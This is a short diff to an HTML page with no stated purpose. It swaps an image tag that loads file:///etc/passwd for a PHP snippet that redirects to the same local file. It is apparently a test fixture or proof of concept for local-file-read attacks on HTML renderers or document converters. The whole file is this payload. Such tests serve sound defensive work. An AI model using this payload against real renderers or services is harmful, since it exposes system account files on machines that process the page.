@@ -1,6 +1,10 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <img src="file:///etc/passwd" />
+<?php
+http_response_code(301);
+header("Location: file:///etc/passwd");
+die();
+?>
   </body>
 </html>
